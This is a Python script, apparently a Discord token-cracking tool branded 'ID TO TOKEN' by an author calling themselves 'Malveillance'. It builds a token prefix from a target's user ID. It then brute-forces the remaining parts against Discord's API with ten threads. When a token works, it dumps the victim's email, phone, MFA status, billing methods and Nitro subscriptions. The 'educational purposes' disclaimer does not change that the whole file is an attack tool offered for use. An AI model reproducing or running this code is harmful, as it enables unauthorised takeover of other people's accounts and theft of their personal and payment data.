# ============================================
# LICENCE D'UTILISATION
# ============================================
# Ce code est protégé par des droits d'auteur et est destiné à un usage personnel uniquement. 
# Vous n'êtes pas autorisé à le modifier, le distribuer, le vendre, ou à en faire des copies à des fins commerciales sans l'autorisation explicite de l'auteur.
# Toute tentative de modification, de revente, ou de redistribution du code sans permission constitue une violation de cette licence et pourra entraîner des poursuites judiciaires.
# 
# Propriétaire du code : Malveillance
# Version : 3.2
# Copyright © 2025
# ============================================



# ============================================
# USAGE LICENSE
# ============================================
# This code is copyrighted and intended for personal use only. 
# You are not allowed to modify, distribute, sell, or make copies of it for commercial purposes without explicit permission from the author.
# Any attempt to modify, resell, or redistribute the code without permission constitutes a breach of this license and may result in legal action.
# 
# Code Owner: Malveillance
# Version: 3.2
# Copyright © 2025
# ============================================






#Ce code est a but éducatif, tout usage malveillant ne sera en aucun cas de la faute de l'auteur
#This code is for educational purposes, any malicious use will in no way be the fault of the author.








import base64
import random
import string
import time
import os
import requests
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

clear()

ascii_art = """
                    -------------------------------------------------------------------------------------
                    | ██╗██████╗     ████████╗ ██████╗     ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗ |
                    | ██║██╔══██╗    ╚══██╔══╝██╔═══██╗    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║ |
                    | ██║██║  ██║       ██║   ██║   ██║       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║ |
                    | ██║██║  ██║       ██║   ██║   ██║       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║ |
                    | ██║██████╔╝       ██║   ╚██████╔╝       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║ |
                    | ╚═╝╚═════╝        ╚═╝    ╚═════╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ |
                    -------------------------------------------------------------------------------------
                                                   Discord : 2l0x ( Malveillance )
"""

print(Fore.MAGENTA + ascii_art)

print(Fore.YELLOW + " [ENTER] USER ID : ", end="")
userid = input()

encodedBytes = base64.b64encode(userid.encode("utf-8"))
encodedStr = str(encodedBytes, "utf-8").rstrip("=")

print(Fore.GREEN + f'\n [LOGS] TOKEN FIRST PART : {encodedStr}')

def generate_random_token_part(length):
    return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=length))

def generate_discord_token():
    part1 = generate_random_token_part(11)
    part2 = generate_random_token_part(46)
    
    return f"{encodedStr}.{part1}.{part2}"

def test_token(token):
    headers = {
        'Authorization': token
    }
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return token, response.json()
    except requests.RequestException as e:
        print(Fore.RED + f"\n [ERROR] Request failed: {e}")
    return None, None

search_permission = input(Fore.YELLOW + "\n [INPUT] Do you want to search for matching tokens? (y/n): ").lower()

if search_permission == 'y':
    found = False
    start_time = time.time()
    max_duration = 20 * 60  

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        while not found:
            token_to_test = generate_discord_token()
            print(Fore.RED + f"\n [INFO] Trying token: {token_to_test}")
            futures.append(executor.submit(test_token, token_to_test))

            for future in as_completed(futures):
                token, user_info = future.result()
                if token:
                    print(Fore.GREEN + f"\n [INFO] MATCHING TOKEN FOUND: {token}")
                    print(Fore.MAGENTA + ascii_art)

                    username = f"{user_info['username']}#{user_info['discriminator']}"
                    user_id = user_info['id']
                    email = user_info['email']
                    phone = user_info.get('phone', 'No phone number')
                    verified = user_info['verified']

                    mfa_response = requests.get('https://discord.com/api/v9/users/@me/mfa', headers={'Authorization': token})
                    mfa_enabled = mfa_response.status_code == 200

                    billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers={'Authorization': token})
                    billing_methods = billing_response.json() if billing_response.status_code == 200 else 'No Payment Method'

                    nitro_response = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers={'Authorization': token})
                    nitro_subscriptions = nitro_response.json() if nitro_response.status_code == 200 else 'No Nitro'

                    print(Fore.CYAN + f"\nUsername: {username}")
                    print(Fore.CYAN + f"User ID: {user_id}")
                    print(Fore.CYAN + f"MFA enabled: {'Yes' if mfa_enabled else 'No'}")
                    print(Fore.CYAN + f"Email: {email}")
                    print(Fore.CYAN + f"Phone: {phone}")
                    print(Fore.CYAN + f"Verified: {'Yes' if verified else 'No'}")
                    print(Fore.CYAN + f"Nitro: {nitro_subscriptions}")
                    print(Fore.CYAN + f"Billing Method(s): {billing_methods}")

                    found = True
                    break

            if time.time() - start_time > max_duration:
                print(Fore.RED + "\n [INFO] Time limit reached (20 minutes). Exiting the search.")
                break

            time.sleep(0.01)

    if not found:
        print(Fore.RED + "\n [INFO] No matching token found in the given time.")
else:
    print(Fore.RED + "\n [LOGS] Search aborted.")
